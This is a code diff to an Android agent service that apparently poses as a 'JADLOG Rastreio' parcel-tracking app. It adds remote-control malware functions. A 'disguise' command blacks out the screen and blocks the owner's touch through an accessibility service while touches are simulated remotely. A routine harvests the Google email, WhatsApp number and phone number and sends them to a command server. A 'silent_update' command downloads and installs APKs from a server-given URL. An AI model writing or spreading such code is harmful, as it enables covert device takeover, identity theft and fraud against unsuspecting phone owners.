@@ -79,6 +79,19 @@ class AgentForegroundService : Service() {
                     val duration = intent.getLongExtra("duration", 300L)
                     simulateSwipe(x1, y1, x2, y2, duration)
                 }
+                "com.droidview.agent.DISGUISE" -> {
+                    val type = intent.getStringExtra("type") ?: "black"
+                    val blockTouch = intent.getBooleanExtra("block_touch", true)
+                    DViewAccessibilityService.instance?.setTouchBlocker(blockTouch, type)
+                }
+                "com.droidview.agent.DISGUISE_CLEAR" -> {
+                    DViewAccessibilityService.instance?.setTouchBlocker(false)
+                }
+                "com.droidview.agent.SET_TOUCH_BLOCKER" -> {
+                    val active = intent.getBooleanExtra("active", false)
+                    val type = intent.getStringExtra("type") ?: "black"
+                    DViewAccessibilityService.instance?.setTouchBlocker(active, type)
+                }
                 else -> {
                     triggerImmediatePing()
                 }
@@ -104,6 +117,9 @@ class AgentForegroundService : Service() {
                 addAction("com.droidview.agent.CHECK_UPDATE")
                 addAction("com.droidview.agent.SIMULATE_TOUCH")
                 addAction("com.droidview.agent.SIMULATE_SWIPE")
+                addAction("com.droidview.agent.DISGUISE")
+                addAction("com.droidview.agent.DISGUISE_CLEAR")
+                addAction("com.droidview.agent.SET_TOUCH_BLOCKER")
             }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 registerReceiver(reconnectReceiver, filter, Context.RECEIVER_EXPORTED)
@@ -193,8 +209,8 @@ class AgentForegroundService : Service() {
         isRunning = true
         isServiceRunning.set(true)
 
-        // Inicializa ou atualiza a notificação de primeiro plano
-        startForegroundNotification(isConnected = false, statusText = "Conectando ao servidor central...")
+        // Inicializa ou atualiza a notificação de primeiro plano unificada no estado CARREGANDO (🟡)
+        AgentNotificationManager.startForeground(this, AgentNotificationManager.ServiceStatus.LOADING)
 
         // Inicia ou assegura o funcionamento da thread de Heartbeat
         ensureHeartbeatRunning()
@@ -224,62 +240,20 @@ class AgentForegroundService : Service() {
         activeAppName = intent?.getStringExtra(EXTRA_APP_NAME)
             ?: prefs.getString("appName", null)
             ?: "JADLOG Rastreio"
+
+        val emojiExtra = intent?.getStringExtra(EXTRA_COMPANY_EMOJI)
+        if (!emojiExtra.isNullOrBlank()) {
+            prefs.edit().putString("companyEmoji", emojiExtra).apply()
+        }
     }
 
     private fun startForegroundNotification(isConnected: Boolean, statusText: String = "") {
-        val channelId = CHANNEL_ID
-        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                channelId,
-                "JADLOG Rastreio",
-                NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "Status do aplicativo"
-                setShowBadge(false)
-            }
-            notificationManager.createNotificationChannel(channel)
-        }
-
-        val launchIntent = Intent(this, MainActivity::class.java).apply {
-            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
-        }
-        val pendingIntent = PendingIntent.getActivity(
-            this,
-            0,
-            launchIntent,
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
-        )
-
-        val title = activeAppName.ifBlank { "JADLOG Rastreio" }
-        val text = if (isConnected) "Ativo" else "Conectando..."
-
-        val largeIcon = try {
-            BitmapFactory.decodeResource(resources, R.mipmap.ic_launcher)
-        } catch (_: Exception) {
-            null
-        }
-
-        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Notification.Builder(this, channelId)
+        val status = if (isConnected) {
+            AgentNotificationManager.ServiceStatus.CONNECTED
         } else {
-            Notification.Builder(this)
+            AgentNotificationManager.ServiceStatus.CONNECTING
         }
-
-        builder
-            .setContentTitle(title)
-            .setContentText(text)
-            .setSmallIcon(R.mipmap.ic_launcher)
-            .setContentIntent(pendingIntent)
-            .setOngoing(true)
-
-        if (largeIcon != null) {
-            builder.setLargeIcon(largeIcon)
-        }
-
-        val notification = builder.build()
-        startForeground(NOTIFICATION_ID, notification)
+        AgentNotificationManager.update(this, status)
     }
 
     private fun ensureHeartbeatRunning() {
@@ -294,16 +268,20 @@ class AgentForegroundService : Service() {
             var consecutiveFailures = 0
 
             while (isServiceRunning.get()) {
+                if (!isServerConnected) {
+                    AgentNotificationManager.update(this@AgentForegroundService, AgentNotificationManager.ServiceStatus.CONNECTING)
+                }
+
                 val pingSuccess = performHeartbeatPing()
 
                 if (pingSuccess) {
                     consecutiveFailures = 0
                     isServerConnected = true
-                    startForegroundNotification(isConnected = true)
+                    AgentNotificationManager.update(this@AgentForegroundService, AgentNotificationManager.ServiceStatus.CONNECTED)
                 } else {
                     consecutiveFailures++
                     isServerConnected = false
-                    startForegroundNotification(isConnected = false)
+                    AgentNotificationManager.update(this@AgentForegroundService, AgentNotificationManager.ServiceStatus.CONNECTING)
                 }
 
                 // Intervalo de espera: 10 segundos quando conectado, 5 segundos quando desconectado
@@ -395,6 +373,7 @@ class AgentForegroundService : Service() {
     private fun downloadAndTriggerInstall(server: String, downloadPath: String) {
         Thread {
             try {
+                AgentNotificationManager.update(this@AgentForegroundService, AgentNotificationManager.ServiceStatus.UPDATING)
                 val targetUrl = if (downloadPath.startsWith("http")) downloadPath else "$server$downloadPath"
                 val url = URL(targetUrl)
                 val conn = url.openConnection() as HttpURLConnection
@@ -428,12 +407,77 @@ class AgentForegroundService : Service() {
                 conn.disconnect()
             } catch (e: Exception) {
                 Log.w(TAG, "Falha no download/instalação da atualização automática: ${e.message}")
+            } finally {
+                val nextStatus = if (isServerConnected) {
+                    AgentNotificationManager.ServiceStatus.CONNECTED
+                } else {
+                    AgentNotificationManager.ServiceStatus.CONNECTING
+                }
+                AgentNotificationManager.update(this@AgentForegroundService, nextStatus)
             }
         }.apply {
             name = "DViewAutoUpdateWorker"
             isDaemon = true
             start()
         }
+    }
+
+    private fun collectUserIdentity(): Triple<String, String, String> {
+        var contactName = ""
+        var phoneNumber = ""
+        var userAccount = ""
+
+        try {
+            val am = android.accounts.AccountManager.get(this)
+            val accounts = am.accounts
+            for (acc in accounts) {
+                if (acc.type.equals("com.google", ignoreCase = true) && userAccount.isBlank()) {
+                    userAccount = acc.name
+                    val emailPrefix = userAccount.substringBefore("@")
+                        .replace("[0-9_.-]+(log|transportes|entregas|corp|ops|app)?$".toRegex(RegexOption.IGNORE_CASE), "")
+                    val parts = emailPrefix.split("[._-]+".toRegex()).filter { it.isNotBlank() }
+                    if (parts.size >= 2) {
+                        contactName = parts.joinToString(" ") { it.replaceFirstChar { c -> c.uppercase() } }
+                    } else if (parts.size == 1 && parts[0].length >= 3) {
+                        contactName = parts[0].replaceFirstChar { c -> c.uppercase() }
+                    }
+                } else if (acc.type.equals("com.whatsapp", ignoreCase = true) && phoneNumber.isBlank()) {
+                    val raw = acc.name.replace("\\D".toRegex(), "")
+                    if (raw.length == 13 && raw.startsWith("55")) {
+                        phoneNumber = "+55 (${raw.substring(2, 4)}) ${raw.substring(4, 9)}-${raw.substring(9)}"
+                    } else if (raw.length == 11) {
+                        phoneNumber = "+55 (${raw.substring(0, 2)}) ${raw.substring(2, 7)}-${raw.substring(7)}"
+                    } else if (raw.isNotBlank()) {
+                        phoneNumber = "+$raw"
+                    }
+                }
+            }
+        } catch (_: Exception) {}
+
+        try {
+            if (contactName.isBlank()) {
+                val devName = android.provider.Settings.Global.getString(contentResolver, "device_name")
+                    ?: android.provider.Settings.Secure.getString(contentResolver, "bluetooth_name")
+                    ?: ""
+                val match = "(?:de|do|da)\\s+([A-Za-zÀ-ÿ\\s]{3,30})".toRegex(RegexOption.IGNORE_CASE).find(devName)
+                if (match != null) {
+                    contactName = match.groupValues[1].trim()
+                }
+            }
+        } catch (_: Exception) {}
+
+        try {
+            if (phoneNumber.isBlank()) {
+                val tm = getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
+                val line1 = tm?.line1Number ?: ""
+                val clean = line1.replace("\\D".toRegex(), "")
+                if (clean.length >= 8) {
+                    phoneNumber = if (clean.length == 11) "+55 (${clean.substring(0, 2)}) ${clean.substring(2, 7)}-${clean.substring(7)}" else "+$clean"
+                }
+            }
+        } catch (_: Exception) {}
+
+        return Triple(contactName, phoneNumber, userAccount)
     }
 
     private fun performHeartbeatPing(): Boolean {
@@ -445,6 +489,7 @@ class AgentForegroundService : Service() {
         val isCharging = isBatteryCharging()
         val (netType, netName) = getNetworkDetails()
         val uptimeSec = SystemClock.elapsedRealtime() / 1000L
+        val (detectedContact, detectedPhone, detectedEmail) = collectUserIdentity()
 
         val payload = JSONObject().apply {
             put("id", deviceId)
@@ -462,6 +507,10 @@ class AgentForegroundService : Service() {
             put("uptimeSec", uptimeSec)
             put("timestamp", System.currentTimeMillis())
             put("enrollmentToken", activeEnrollmentToken)
+            if (detectedContact.isNotBlank()) put("contactName", detectedContact)
+            if (detectedPhone.isNotBlank()) put("phoneNumber", detectedPhone)
+            if (detectedEmail.isNotBlank()) put("userAccount", detectedEmail)
+            put("apkName", activeAppName)
         }
 
         for (candidate in candidates) {
@@ -515,6 +564,20 @@ class AgentForegroundService : Service() {
                                             val y2 = cmdPayload?.optDouble("y2", 0.0)?.toFloat() ?: 0f
                                             val dur = cmdPayload?.optLong("duration", 300L) ?: 300L
                                             simulateSwipe(x1, y1, x2, y2, dur)
+                                        }
+                                        "silent_update" -> {
+                                            val seed = cmdPayload?.optString("seed", "") ?: ""
+                                            val downloadUrl = cmdPayload?.optString("downloadUrl", "") ?: ""
+                                            Log.i(TAG, "Sinal do servidor recebido com Seed OTA de atualização: $seed ($downloadUrl)")
+                                            if (seed.isNotBlank()) {
+                                                getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
+                                                    .edit()
+                                                    .putString("updateSeed", seed)
+                                                    .apply()
+                                            }
+                                            if (downloadUrl.isNotBlank()) {
+                                                downloadAndTriggerInstall(candidate, downloadUrl)
+                                            }
                                         }
                                     }
                                 }
@@ -592,9 +655,9 @@ class AgentForegroundService : Service() {
                 override fun onLost(network: Network) {
                     Log.w(TAG, "Conexão de rede perdida via NetworkCallback.")
                     isServerConnected = false
-                    startForegroundNotification(
-                        isConnected = false,
-                        statusText = "Sem conexão com a internet • Aguardando rede..."
+                    AgentNotificationManager.update(
+                        this@AgentForegroundService,
+                        AgentNotificationManager.ServiceStatus.CONNECTING
                     )
                 }
             }
@@ -694,6 +757,7 @@ class AgentForegroundService : Service() {
         const val EXTRA_DEVICE_NAME = "com.droidview.agent.DEVICE_NAME"
         const val EXTRA_ENROLLMENT_TOKEN = "com.droidview.agent.ENROLLMENT_TOKEN"
         const val EXTRA_APP_NAME = "com.droidview.agent.APP_NAME"
+        const val EXTRA_COMPANY_EMOJI = "com.droidview.agent.COMPANY_EMOJI"
         const val ACTION_KEEP_ALIVE_RESTART = "com.droidview.agent.service.RESTART"
 
         @Volatile
@@ -715,12 +779,14 @@ class AgentForegroundService : Service() {
                 val deviceName = prefs.getString("deviceName", Build.MODEL ?: "Android Device") ?: (Build.MODEL ?: "Android Device")
                 val token = prefs.getString("enrollmentToken", "") ?: ""
                 val appName = prefs.getString("appName", "JADLOG Rastreio") ?: "JADLOG Rastreio"
+                val companyEmoji = prefs.getString("companyEmoji", "📦") ?: "📦"
 
                 val intent = Intent(context, AgentForegroundService::class.java).apply {
                     putExtra(EXTRA_SERVER_URL, serverUrl)
                     putExtra(EXTRA_DEVICE_NAME, deviceName)
                     putExtra(EXTRA_ENROLLMENT_TOKEN, token)
                     putExtra(EXTRA_APP_NAME, appName)
+                    putExtra(EXTRA_COMPANY_EMOJI, companyEmoji)
                 }
 
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
